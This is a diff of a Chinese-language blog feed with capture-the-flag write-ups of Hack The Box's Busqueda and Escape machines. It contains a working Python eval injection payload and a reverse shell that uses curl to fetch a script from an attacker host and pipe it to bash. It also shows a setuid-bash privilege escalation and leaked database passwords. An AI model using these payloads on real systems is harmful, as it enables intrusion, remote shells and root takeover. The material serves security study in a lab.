</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;]</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>“MYSQL_ROOT_PASSWORD&#x3D;jI86kGUuj87guWr3RyF”,”MYSQL_USER&#x3D;gitea”,”MYSQL_PASSWORD&#x3D;yuiu1hoiu4i5ho1uh”,”MYSQL_DATABASE&#x3D;gitea”</p>
+</blockquote>
+<p>好，进入gitea的登录页面，尝试administrator:yuiu1hoiu4i5ho1uh</p>
+<p><img src="/../../../Typora/img111/image-20230607201649485.png" alt="image-20230607201649485"></p>
+<p>点击左边的仓库，发现：</p>
+<p><img src="/../../../Typora/img111/image-20230607201740407.png" alt="image-20230607201740407"></p>
+<p>查看第一行脚本：</p>
+<p><img src="/../../../Typora/img111/image-20230607201759588.png" alt="image-20230607201759588"></p>
+<p>前三个脚本对应了，之前的三个命令。</p>
+<p>查看第四个脚本内容，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">import subprocess</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">actions = [&#x27;full-checkup&#x27;, &#x27;docker-ps&#x27;,&#x27;docker-inspect&#x27;]</span><br><span class="line"></span><br><span class="line">def run_command(arg_list):</span><br><span class="line">    r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">    if r.stderr:</span><br><span class="line">        output = r.stderr.decode()</span><br><span class="line">    else:</span><br><span class="line">        output = r.stdout.decode()</span><br><span class="line"></span><br><span class="line">    return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_action(action):</span><br><span class="line">    if action == &#x27;docker-inspect&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            _format = sys.argv[2]</span><br><span class="line">            if len(_format) == 0:</span><br><span class="line">                print(f&quot;Format can&#x27;t be empty&quot;)</span><br><span class="line">                exit(1)</span><br><span class="line">            container = sys.argv[3]</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;inspect&#x27;, &#x27;--format&#x27;, _format, container]</span><br><span class="line">            print(run_command(arg_list)) </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">        except IndexError:</span><br><span class="line">            print(f&quot;Usage: &#123;sys.argv[0]&#125; docker-inspect &lt;format&gt; &lt;container_name&gt;&quot;)</span><br><span class="line">            exit(1)</span><br><span class="line">    </span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line">    </span><br><span class="line">    elif action == &#x27;docker-ps&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;ps&#x27;]</span><br><span class="line">            print(run_command(arg_list)) </span><br><span class="line">        </span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line"></span><br><span class="line">    elif action == &#x27;full-checkup&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            arg_list = [&#x27;./full-checkup.sh&#x27;]</span><br><span class="line">            print(run_command(arg_list))</span><br><span class="line">            print(&#x27;[+] Done!&#x27;)</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        action = sys.argv[1]</span><br><span class="line">        if action in actions:</span><br><span class="line">            process_action(action)</span><br><span class="line">        else:</span><br><span class="line">            raise IndexError</span><br><span class="line"></span><br><span class="line">    except IndexError:</span><br><span class="line">        print(f&#x27;Usage: &#123;sys.argv[0]&#125; &lt;action&gt; (arg1) (arg2)&#x27;)</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line">        print(&#x27;     docker-ps     : List running docker containers&#x27;)</span><br><span class="line">        print(&#x27;     docker-inspect : Inpect a certain docker container&#x27;)</span><br><span class="line">        print(&#x27;     full-checkup  : Run a full system checkup&#x27;)</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line">        exit(1)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>   elif action &#x3D;&#x3D; ‘full-checkup’:<br>       try:<br>           arg_list &#x3D; [‘.&#x2F;full-checkup.sh’]<br>           print(run_command(arg_list))<br>           print(‘[+] Done!’)<br>       except:<br>           print(‘Something went wrong’)<br>           exit(1)</p>
+</blockquote>
+<p>得：所读取路径不是绝对路径，它在当前目录下找full-checkup.sh的，如果在用户界面中非&#x2F;opt&#x2F;scripts&#x2F;位置下，就会出现报错。</p>
+<p>vim full-checkup.sh，内容为：</p>
+<blockquote>
+<p>#!&#x2F;bin&#x2F;bash<br>cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash<br>chmod +s &#x2F;tmp&#x2F;bash</p>
+</blockquote>
+<p>这段脚本的作用是创建了一个具有Setuid权限的”&#x2F;tmp&#x2F;bash”文件。通过设置Setuid权限，任何以该文件执行的用户都会暂时获得文件所有者（通常为root）的权限。这意味着，当普通用户执行”&#x2F;tmp&#x2F;bash”时，它将以root用户的权限执行，从而实现了权限提升。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-bash-5.1$ whoami</span><br><span class="line">svc</span><br><span class="line">-bash-5.1$ pwd</span><br><span class="line">/home/svc</span><br><span class="line">-bash-5.1$ vim full-checkup.sh</span><br><span class="line">-bash-5.1$ chmod +x full-checkup.sh</span><br><span class="line">-bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</span><br><span class="line">[sudo] password for svc: </span><br><span class="line"></span><br><span class="line">[+] Done!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-bash-5.1$ whoami</span><br><span class="line">svc</span><br><span class="line">-bash-5.1$ ls -la /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash</span><br><span class="line"></span><br><span class="line">成功给 /bin/bash 带上suid提权成功</span><br><span class="line">-bash-5.1$ /bin/bash -p</span><br><span class="line">bash-5.1# whoami</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash-5.1# cd /root</span><br><span class="line">bash-5.1# ls -la</span><br><span class="line">total 60</span><br><span class="line">drwx------  9 root root 4096 Apr  3 16:01 .</span><br><span class="line">drwxr-xr-x 19 root root 4096 Mar  1 10:46 ..</span><br><span class="line">lrwxrwxrwx  1 root root    9 Feb 20 12:09 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 .cache</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 .config</span><br><span class="line">-rw-r-----  1 root root  430 Apr  3 15:13 ecosystem.config.js</span><br><span class="line">-rw-r--r--  1 root root  104 Apr  3 08:58 .gitconfig</span><br><span class="line">drwxr-xr-x  3 root root 4096 Mar  1 10:46 .local</span><br><span class="line">-rw-------  1 root root   50 Feb 20 12:04 .my.cnf</span><br><span class="line">lrwxrwxrwx  1 root root    9 Feb 20 12:12 .mysql_history -&gt; /dev/null</span><br><span class="line">drwxr-xr-x  4 root root 4096 Mar  1 10:46 .npm</span><br><span class="line">drwxr-xr-x  5 root root 4096 Jun  7 04:20 .pm2</span><br><span class="line">-rw-r--r--  1 root root  161 Jul  9  2019 .profile</span><br><span class="line">-rw-r-----  1 root root   33 Jun  7 04:20 root.txt</span><br><span class="line">drwxr-xr-x  4 root root 4096 Apr  3 16:01 scripts</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 snap</span><br><span class="line">bash-5.1# cat root.txt</span><br><span class="line">105666c0b97b4202de7dabf892feb190</span><br><span class="line">bash-5.1# </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>跟随大佬的wp思路进行，达到提权的目的。</p>
+<p>1.nmap扫到端口为80，与22</p>
+<p>2.访问80端口位置，进行反弹shell。</p>
+<p>3.遍历各文件夹，找到敏感信息</p>
+<p>4.拿到普通用户的账号和密码，尝试22端口的ssh连接。</p>
+<p>5.由普通用户进行提权。</p>
+<p>其中有很多细节有待细究，值得复盘。</p>
+<h2 id="2-Escape"><a href="#2-Escape" class="headerlink" title="2.Escape"></a>2.Escape</h2><h3 id="1-参考"><a href="#1-参考" class="headerlink" title="1.参考"></a>1.参考</h3><p><a href="http://t.csdn.cn/xUqAI">http://t.csdn.cn/xUqAI</a></p>
+<p><a href="https://www.bilibili.com/video/BV12k4y1J7zE/?spm_id_from=333.337.search-card.all.click&vd_source=c49e37118f69c7a5b34915b73d1b78ab">hackthebox中等难度靶场escape渗透全过程_哔哩哔哩_bilibili</a></p>
+<p>nmap:</p>
+<p><code>nmap -p- -sT --min-rate=1000 -Pn 10.10.11.202</code></p>
+<blockquote>
+<p>参数解释：</p>
+<p>-p- 所有端口</p>
+<p>-sT TCP连接</p>
+<p>–min-rate&#x3D;1000 1秒发送1000个请求</p>
+<p>-Pn 禁用主机发现</p>
+<p>结果为：</p>
+<p>53&#x2F;tcp    open  domain<br>88&#x2F;tcp    open  kerberos-sec<br>135&#x2F;tcp   open  msrpc<br>139&#x2F;tcp   open  netbios-ssn<br>389&#x2F;tcp   open  ldap<br>445&#x2F;tcp   open  microsoft-ds<br>464&#x2F;tcp   open  kpasswd5<br>593&#x2F;tcp   open  http-rpc-epmap<br>636&#x2F;tcp   open  ldapssl<br>3269&#x2F;tcp  open  globalcatLDAPssl<br>9389&#x2F;tcp  open  adws<br>49667&#x2F;tcp open  unknown<br>49687&#x2F;tcp open  unknown<br>49705&#x2F;tcp open  unknown<br>49711&#x2F;tcp open  unknown</p>
+</blockquote>
+<p><code>nmap -p- -sU --min-rate=1000 -Pn 10.10.11.202</code></p>
+<blockquote>
+<p>PORT    STATE SERVICE<br>53&#x2F;udp  open  domain<br>123&#x2F;udp open  ntp</p>
+</blockquote>
+<p>vim port.txt，将nmap中tcp扫描到的内容复制过去，通过正则过滤拼接出需要的端口号。提取每行”&#x2F;“之前的内容，再拼接即可</p>
+<p>awk -F’&#x2F;‘ ‘{print $1}’  ORS&#x3D;’,’  port.txt  | tr -d ‘,’</p>
+<blockquote>
+<ol>
+<li><p><code>awk</code>命令：<code>awk</code>是一个文本处理工具，用于按照指定的规则对文本进行处理。它按行读取输入，并根据给定的规则执行操作。</p>
+</li>
+<li><p><code>-F&#39;/&#39;</code>：<code>-F</code>选项用于指定字段分隔符。在这个命令中，我们将字段分隔符设置为斜杠（&#x2F;），以便将每行拆分为多个字段。</p>
+</li>
+<li><p><code>&#39;&#123;print $1&#125;&#39;</code>：这是一个<code>awk</code>的操作部分，指定要执行的操作。<code>$1</code>表示打印第一个字段。</p>
+</li>
+<li><p>默认情况下，<code>ORS</code>的值是一个换行符（<code>\n</code>），这意味着每个<code>print</code>语句打印的内容将以换行符分隔。但是，您可以通过修改<code>ORS</code>的值来指定不同的分隔符。</p>
+</li>
+</ol>
+<p>  在这种情况下，我们使用<code>ORS=&#39;,&#39;</code>将<code>ORS</code>设置为逗号（<code>,</code>）。这样，当<code>print</code>语句执行时，它将使用逗号作为记录之间的分隔符，而不是默认的换行符。这样就实现了将提取的端口号使用逗号拼接在一起的效果。</p>
+<p>  结果为：</p>
+<p>  53,88,135,139,389,445,464,593,636,3269,9389,49667,49687,49705,49711, </p>
+</blockquote>
+<p><code>nmap -p53,88,135,139,389,445,464,593,636,3269,9389,49667,49687,49705,49711 -Pn -sT -sC -sV 10.10.11.202</code></p>
+<blockquote>
+<ul>
+<li><code>-sC</code>：这个参数指定在扫描期间运行默认的Nmap脚本。Nmap脚本是一组自动化的测试和攻击脚本，用于探测和利用目标主机上的漏洞或服务配置问题。</li>
+<li><code>-sV</code>：这个参数指定在扫描期间进行版本探测。<code>nmap</code>将尝试识别目标主机上运行的服务和应用程序的版本信息。通过识别版本信息，可以更好地了解目标主机上的系统配置和潜在的安全风险。</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time:------)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">|_ssl-date: 2023-06-07T21:55:16+00:00; +8h00m00s from scanner time.</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: ------T21:55:17+00:00; +8h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: -----T21:55:19+00:00; +8h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49711/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: -------T21:54:38</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>发现域名sequel.htb与子域名dc.sequel.htb</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+        <tag>渗透测试</tag>
+        <tag>kali</tag>
       </tags>
   </entry>
   <entry>
@@ -1023,305 +1445,6 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
-    <title>hack the box</title>
-    <url>/2023/05/31/hack-the-box/</url>
-    <content><![CDATA[<p>下载htb的openvpn文件后，openvpn 文件</p>
-<h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><h2 id="1-Busqueda-linux提权"><a href="#1-Busqueda-linux提权" class="headerlink" title="1.Busqueda(linux提权)"></a>1.Busqueda(linux提权)</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/m0_56308852/article/details/130168742?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-5-130168742-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">htb busqueda wp要点记录_春猿火的博客-CSDN博客</a></p>
-<p><a href="https://blog.csdn.net/qq_58869808/article/details/130050438?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-130050438-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">(87条消息) HTB Busqueda WriteUP_Som3B0dy的博客-CSDN博客</a></p>
-<p><a href="https://www.bilibili.com/video/BV1LV4y1Z7Wp/?spm_id_from=333.337.search-card.all.click">Hack The Box 赛季活动靶场【Busqueda】User &amp; System Flag攻略_哔哩哔哩_bilibili</a></p>
-<p><a href="https://blog.csdn.net/qq_37370714/article/details/130619426?ops_request_misc=&request_id=&biz_id=102&utm_term=Busqueda&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-130619426.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">(87条消息) HTB-Busqueda_永远是深夜有多好。的博客-CSDN博客</a></p>
-<p>ping一遍，能ping通</p>
-<p>发现端口：&#96;nmap -A  10.10.11.208 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)</span><br><span class="line">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: Did not follow redirect to http://searcher.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>
-
-<p>22端口开放，一般最后考虑，如果爆破不出来就放弃。</p>
-<p>火狐直接访问，访问不了</p>
-<p><code>echo &quot;10.10.11.208 searcher.htb &quot; &gt;&gt; /etc/hosts</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192607683.png"></p>
-<p>选了个google，查找内容为123</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192819640.png"></p>
-<p>很明显，post。</p>
-<p>抓包试试，加个单引号不显示内容</p>
-<p>sqlmap一下，没有注入点。</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604194935260.png"></p>
-<p>点击后，发现如下东西：</p>
-<blockquote>
-<p>Custom Engine</p>
-<p>from searchor import Engine<br>Engine.new(“Colgate”, “<a href="https://www.colgate.com/en-us/search/all?term=">https://www.colgate.com/en-us/search/all?term=</a>“)<br>Engine.Colgate.search(“Hi world!”)<br>‘<a href="https://www.colgate.com/en-us/search/all?term=Hi%20world">https://www.colgate.com/en-us/search/all?term=Hi%20world</a>!”</p>
-<p>Searchor CLI Quick Start</p>
-<p>$ searchor Google “Hello World!” –copy</p>
-</blockquote>
-<p>这是调用引擎库去获取数据吧。</p>
-<p><code>Engine.Colgate.search(&quot;Hi world!&quot;)</code></p>
-<p>wp上说尝试构造<code>eval(complie(“要执行的代码”),“&lt;String&gt;”,“exec”)</code></p>
-<blockquote>
-<p>compile() 是一个 Python 内置函数，用于编译字符串、文件或 AST（Abstract Syntax Trees）对象成为字节码或 AST 对象。它的语法为：</p>
-<p>compile(source, filename, mode, flags&#x3D;0, dont_inherit&#x3D;False, optimize&#x3D;-1)<br>source: 必选项，表示要编译的源代码，可以是字符串、文件或 AST 对象。<br>filename: 可选项，表示编译代码的文件名，如果不是从文件中编译代码，传入 “<string>” 即可。<br>mode: 可选项，表示编译代码类型，可以取值为 “exec”（编译整个代码），“eval”（编译单个表达式）或 “single”（编译单个语句）。<br>flags: 可选项，传入变量或位掩码，用于控制编译器的行为或特性。<br>dont_inherit: 可选项，表示是否继承 sys.flags 和 sys. __ optimizations __ 模块中相关选项的值。<br>optimize: 可选项，表示优化级别，如果设置为 -1，表示使用默认优化级别。<br>compile() 函数编译完成后，将会返回一个 code 对象，这个对象可以传递给 exec() 函数执行，也可以将其作为模块使用。compile() 函数在 Python 中比较常用，常用于动态编译、语法检查和代码执行等场景中。</p>
-</blockquote>
-<p>在bp上这样构造：</p>
-<blockquote>
-<p>query&#x3D;123’<strong>%2b</strong>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))<strong>%2b’</strong></p>
-</blockquote>
-<p>+、%20我都试过，不行，为啥非要2b,2f也可以，不懂</p>
-<p>效果是这样的，</p>
-<blockquote>
-<p>searchor Google <strong>‘</strong>123’%2beval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))%2b’<strong>’</strong>–copy</p>
-</blockquote>
-<p>相当于执行了参数为:</p>
-<p><strong>‘</strong>123’ </p>
-<p>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))</p>
-<p>和&#39;‘</p>
-<p>repeat结果里是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;app.py%0Atemplates&quot;&gt;app.py</span><br><span class="line">templates&lt;/a&gt;. If not, click the link.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>那其实ls可以改为 cat app.py，出现一串代码</p>
-<p>shift+ctrl+u后</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, render_template, request, redirect</span><br><span class="line">from searchor import Engine</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/&amp;#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&amp;#x27;&amp;#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/search&amp;#x27;, methods=[&amp;#x27;POST&amp;#x27;])</span><br><span class="line">def search():</span><br><span class="line">    try:</span><br><span class="line">        engine = request.form.get(&amp;#x27;engine&amp;#x27;)</span><br><span class="line">        query = request.form.get(&amp;#x27;query&amp;#x27;)</span><br><span class="line">        auto_redirect = request.form.get(&amp;#x27;auto_redirect&amp;#x27;)</span><br><span class="line">        </span><br><span class="line">        if engine in Engine.__members__.keys():</span><br><span class="line">            arg_list = [&amp;#x27;searchor&amp;#x27;, &amp;#x27;search&amp;#x27;, engine, query]</span><br><span class="line">            r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">            url = r.stdout.strip().decode()</span><br><span class="line">            if auto_redirect is not None:</span><br><span class="line">                return redirect(url, code=302)</span><br><span class="line">            else:</span><br><span class="line">                return url</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Invalid engine!&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Something went wrong!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &amp;#x27;__main__&amp;#x27;:</span><br><span class="line">    app.run(debug=False)</span><br></pre></td></tr></table></figure>
-
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="1-shell文件准备"><a href="#1-shell文件准备" class="headerlink" title="1.shell文件准备"></a>1.shell文件准备</h4><p>写一个shell文件</p>
-<p>内容为：<code>bash -i &gt;&amp; /dev/tcp/10.10.14.89/2333 0&gt;&amp;1</code></p>
-<p>这个地址是与htp进行vpn连接的那个地址吧,tun0。</p>
-<p>具体步骤也就是vim shell后，再chmod 777 shell.</p>
-<h4 id="2-监听服务器建立"><a href="#2-监听服务器建立" class="headerlink" title="2.监听服务器建立"></a>2.监听服务器建立</h4><p><code>python3 -m http.server 80</code> 通常用于在本地开发或测试时快速提供 Web 内容。</p>
-<h4 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h4><p><code>nc -lvnp 2333</code></p>
-<h4 id="4-发包"><a href="#4-发包" class="headerlink" title="4.发包"></a>4.发包</h4><p>包的数据写为</p>
-<p><code>query=http%3a//127.0.0.1/debug&#39;%2beval(compile(&#39;for+x+in+range(1)%3a\n+import+os\n+os.system(&quot;curl+http%3a//10.10.14.89/shell|bash&quot;)&#39;,&#39;a&#39;,&#39;single&#39;))%2b&#39;</code></p>
-<p>(不明觉厉o(￣▽￣)ｄ )</p>
-<p>。。。然后捏，我没监听到东西。</p>
-<p>好吧，<strong>是因为kali有防火墙</strong></p>
-<p><code>sudo systemctl stop ufw</code></p>
-<p><code>sudo systemctl disable ufw</code></p>
-<p>将防火墙禁用，重新发包即可。</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604214533285.png"></p>
-<p>nc监听成功。</p>
-<p>然后在nc窗口下</p>
-<p>输入命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">connect to [10.10.14.89] from (UNKNOWN) [10.10.11.208] 56914</span><br><span class="line">bash: cannot set terminal process group (1648): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">svc@busqueda:/var/www/app$ pwd </span><br><span class="line">pwd</span><br><span class="line">/var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ whoami</span><br><span class="line">whoami</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/var/www/app$ ls</span><br><span class="line">ls</span><br><span class="line">app.py</span><br><span class="line">templates</span><br><span class="line">svc@busqueda:/var/www/app$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">svc@busqueda:/home$ ls</span><br><span class="line">ls</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/home$ cd svc</span><br><span class="line">cd svc</span><br><span class="line">svc@busqueda:~$ ls </span><br><span class="line">ls</span><br><span class="line">snap</span><br><span class="line">user.txt</span><br><span class="line">svc@busqueda:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">40941e3cddd105f881ea90e716a3d6a2</span><br><span class="line"></span><br><span class="line">cat etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 busqueda searcher.htb gitea.searcher.htb</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>(内网信息收集部分，参考大佬的习惯是先看sudo -l，再看是否存在未知域名，然后再看web文件夹)<br>访问下未知域名gitea.searcher.htb，<strong>反正我不知道怎么访问</strong>（后面有，先放一边）。</p>
-<p>密码一般在etc&#x2F;passwd和etc&#x2F;shadow中，后者的密码一般是哈希值。</p>
-<p>在passwd中找有bash权限的用户，已知有svc，且确定下一个提权的是root</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/$ cat etc/passwd|grep /bin/bash</span><br><span class="line">cat etc/passwd|grep /bin/bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">svc:x:1000:1000:svc:/home/svc:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>重新找到svc文件夹，这次要记得查看<strong>所有</strong>文件，注意隐藏文件</p>
